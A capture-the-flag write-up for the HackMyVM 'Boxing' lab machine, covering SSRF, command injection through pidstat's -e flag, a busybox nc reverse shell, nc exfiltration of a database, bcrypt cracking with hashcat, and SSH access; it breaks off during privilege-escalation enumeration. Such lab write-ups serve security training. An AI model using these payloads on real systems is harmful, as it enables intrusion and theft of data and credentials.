| Name   | Difficulty | OS    | Target IP     | Link                                               |
| ------ | ---------- | ----- | ------------- | -------------------------------------------------- |
| Boxing | Medium     | Linux | 192.168.0.112 | https://hackmyvm.eu/machines/machine.php?vm=Boxing |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/boxing$ sudo arp-scan -l | grep b6
192.168.0.112	08:00:27:22:13:b6	PCS Systemtechnik GmbH
```

### Nmap Scan

```bash
garffff@garffff:~/hackmyvm/boxing$ sudo nmap -p- -sV -sC 192.168.0.112 -oA nmap/boxing.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-02 11:35 GMT
Nmap scan report for staging-env.boxing.hmv (192.168.0.112)
Host is up (0.000051s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Staging Env Boxing
MAC Address: 08:00:27:22:13:B6 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

Visiting port 80

We see a hostname for this box, so I will add it to my host file

![[Pasted image 20241102113627.png]]

The only potential function I can find on this page was is the feedback form:

![[Pasted image 20241102113748.png]]

Messing about with this form, I tried various this e.g. SQLi, XSS etc but nothing was working. In Burp suite I did notice this:

![[Pasted image 20241102113925.png]]

I will add this new URL into my host file, and visit the site:

![[Pasted image 20241102114007.png]]

Trying to go to http://127.0.0.1 failed:

![[Pasted image 20241102114049.png]]

And visiting http://boxing.hmv worked:

![[Pasted image 20241102114130.png]]

This smells like a SSRF vulnerability. Having not worked on many of these I will use the portswigger page to help me: https://portswigger.net/web-security/ssrf



Using a `@` followed by the loopback address of the host gave me a valid response:

![[Pasted image 20241102120316.png]]

I can see the page size here, which is the same with or without the `@127.0.0.1`:

![[Pasted image 20241102120346.png]]

Next I will do a port scan on the 127.0.0.1 using burps intruder. Here I will be scanning from 0 to 65000 ports:

![[Pasted image 20241102120547.png]]

Looking at the results, there is a match for port 5000:

![[Pasted image 20241102120634.png]]

So I should be able to visit this service in the webbrowser:

![[Pasted image 20241102120724.png]]

Which works. Now I am presented with another screen:

![[Pasted image 20241102120805.png]]

Using the input boxes POST request did not give me any results. However, using `processName` as a parameter in the URL did work:

![[Pasted image 20241102121557.png]]

The output in the response looks like `pidstat` command was used. As an example, this is my output from that command on my local system:

```bash
garffff@garffff:~/Downloads$ pidstat
Linux 5.15.0-124-generic (garffff) 	02/11/24 	_x86_64_	(8 CPU)

12:19:45      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
12:19:45        0         1    0.07    0.06    0.00    0.00    0.12     1  systemd
12:19:45        0        13    0.00    0.00    0.00    0.00    0.00     0  ksoftirqd/0
12:19:45        0        14    0.08    0.00    0.00    0.02    0.08     7  rcu_sched
```

Using https://gtfobins.github.io/gtfobins/pidstat/, we see that a system command can be used with the `-e` flag:

![[Pasted image 20241102122149.png]]

To gain RCE, the URL part where the command is being executed, needs to be URL encoded twice, as we are essentially going through two website:

Original URL: `POST /index.php?url=http://boxing.hmv@127.0.0.1:5000?processName=processName -e ls `

Encoded URL: `POST /index.php?url=http://boxing.hmv@127.0.0.1:5000?processName=processName%2b-e%2bls%2b`

![[Pasted image 20241102122355.png]]

We now have command execution, so we should be able to get a shell. Using https://www.revshells.com/, the first reverse shell command to work was `busybox nc 192.168.0.51 443 -e sh` so I will use this:

```bash
POST /index.php?url=http://boxing.hmv@127.0.0.1:5000?processName=processName%2b-e%2bbusybox%2bnc%2b192.168.0.51%2b443%2b-e%2bsh HTTP/1.1
Host: staging-env.boxing.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://staging-env.boxing.hmv
Connection: keep-alive
Referer: http://staging-env.boxing.hmv/index.php?url=http%3A%2F%2Fboxing.hmv%40127.0.0.1%3A5000
Upgrade-Insecure-Requests: 1
Priority: u=0, i

processName=
```

Gives me a shell:

```bash
garffff@garffff:~/hackmyvm/boxing$ sudo nc -lvp 443
Listening on 0.0.0.0 443
Connection received on staging-env.boxing.hmv 55862
whoami && id
www-data
uid=33(www-data) gid=33(www-data) groupes=33(www-data)
```

Upgraded TTY line:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@boxing:/opt/pidstat$ ^Z
[1]+  Stopped                 sudo nc -lvp 443
garffff@garffff:~/hackmyvm/boxing$ stty raw -echo
sudo nc -lvp 443hackmyvm/boxing$ 


www-data@boxing:/opt/pidstat$ 
```

Looking in the `/var/www/dev/` directory we see a database file:

```bash
www-data@boxing:~/dev$ ls -lash
ls -lash
total 40K
4,0K drwxr-xr-x 3 root root 4,0K  4 févr.  2024 .
4,0K drwxr-xr-x 4 root root 4,0K  4 févr.  2024 ..
 24K -rw-r--r-- 1 root root  24K  4 févr.  2024 boxing_database.db
4,0K drwxr-xr-x 2 root root 4,0K  4 févr.  2024 cache
4,0K -rw-r--r-- 1 root root 1,6K  4 févr.  2024 index.php
```

I copied `boxing_database.db` to my system:

Target:

```bash
www-data@boxing:~/dev$ nc 192.168.0.51 9999 < boxing_database.db
nc 192.168.0.51 9999 < boxing_database.db
www-data@boxing:~/dev$ md5sum boxing_database.db
md5sum boxing_database.db
d3c4cf79912605f146b3a0137c60ac3c  boxing_database.db
```

Host:

```bash
garffff@garffff:~/hackmyvm/boxing$ sudo nc -lvp 9999 > boxing_database.db
[sudo] password for garffff:            
Listening on 0.0.0.0 9999
Connection received on staging-env.boxing.hmv 33362
^C
garffff@garffff:~/hackmyvm/boxing$ md5sum boxing_database.db
d3c4cf79912605f146b3a0137c60ac3c  boxing_database.db
```

There is a hash for the user `cassius` but I was unable to crack it:

![[Pasted image 20241102124822.png]]

Looking around the target further, I came across a file called `client_requests.har.swp`:

```bash
www-data@boxing:~/dev/cache$ ls -lash
ls -lash
total 28K
4,0K drwxr-xr-x 2 root root 4,0K  4 févr.  2024 .
4,0K drwxr-xr-x 3 root root 4,0K  4 févr.  2024 ..
4,0K -rw-r--r-- 1 root root  160  4 févr.  2024 707971e003b4ae6c8121c3a920e507f5-le64.cache-8
4,0K -rw-r--r-- 1 root root  190  4 févr.  2024 CACHEDIR.TAG
8,0K -rw-r--r-- 1 root root 5,1K  4 févr.  2024 client_requests.har.swp
4,0K -rw-r--r-- 1 root root 1,0K  4 févr.  2024 data_block.bin
```




```bash
www-data@boxing:~/dev/cache$ cat client_requests.har.swp
<--SNIP-->
          "queryString": [],
          "cookies": [],
          "headersSize": 563,
          "bodySize": 181,
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "text": "feedback=Hello%21+You+don%27t+have+a+link+to+reset+the+password%2C+and+I%27ve+forgotten+it%21+I+tried+Cassius%21+but+it+doesn%27t+work%3B+Contact+me+asap+pease%21%0D%0A%0D%0ACassius",
            "params": [
              {
                "name": "feedback",
                "value": "Hello%21+You+don%27t+have+a+link+to+reset+the+password%2C+and+I%27ve+forgotten+it%21+I+tried+Cassius%21+but+it+doesn%27t+work%3B+Contact+me+asap+pease%21%0D%0A%0D%0ACassius"
              }
            ]
          }
        },
```

Which translates into:

```bash
Hello!+You+don't+have+a+link+to+reset+the+password,+and+I've+forgotten+it!+I+tried+Cassius!+but+it+doesn't+work;+Contact+me+asap+pease!
```

So we know that their password used to be `Cassius!`. 

```bash
garffff@garffff:~/hackmyvm/boxing$ echo 'Cassius!' > password.txt
garffff@garffff:~/hackmyvm/boxing$ hashcat -m 3200 hash.txt password.txt  -r /opt/OneRuleToRuleThemStill.rule 
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
<--SNIP-->
Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG...c4OnVu
Time.Started.....: Sat Nov  2 12:54:26 2024 (2 secs)
Time.Estimated...: Sat Nov  2 13:10:07 2024 (15 mins, 39 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (password.txt)
Guess.Mod........: Rules (/opt/OneRuleToRuleThemStill.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       52 H/s (4.64ms) @ Accel:4 Loops:8 Thr:11 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 97/49229 (0.20%)
Rejected.........: 0/97 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:97-98 Iteration:24-32
Candidate.Engine.: Device Generator
Candidates.#1....: Bassies! -> Bassies!
Hardware.Mon.#1..: Temp: 62c Fan: 31% Util: 99% Core:1911MHz Mem:5508MHz Bus:16

$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu:Cassius!123
```

SSH Credentials:

```
ssh cassius@192.168.0.112:Cassius!123
```

So now we should be able to ssh into that user and grab the first flag:

```bash
garffff@garffff:~/hackmyvm/boxing$ ssh cassius@192.168.0.112
The authenticity of host '192.168.0.112 (192.168.0.112)' can't be established.
ED25519 key fingerprint is SHA256:wQ4AA13WzS+DnZ3CX93jGyXamANQ1waSb5GMik3XS1k.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.112' (ED25519) to the list of known hosts.
cassius@192.168.0.112's password: 
Linux boxing 6.1.0-17-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.69-1 (2023-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb  4 17:20:33 2024 from 192.168.0.30
cassius@boxing:~$ ls
user.txt
cassius@boxing:~$ cat user.txt 
a2b3946358a96bb7a92f61a759a1d972
```



Priv Esc:

Nothing in the SUID:

```bash
cassius@boxing:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

But the GUID has an unknown file:

```bash
cassius@boxing:~$ find / -perm /6000 -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/su
/usr/bin/crontab
/usr/bin/chsh
/usr/bin/incrontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/wall
/usr/bin/passwd
/usr/bin/write
/usr/bin/dotlockfile
/usr/bin/chfn
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/umount
/usr/bin/chage
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

The `/usr/bin/incrontab` file looks interesting

```bash
```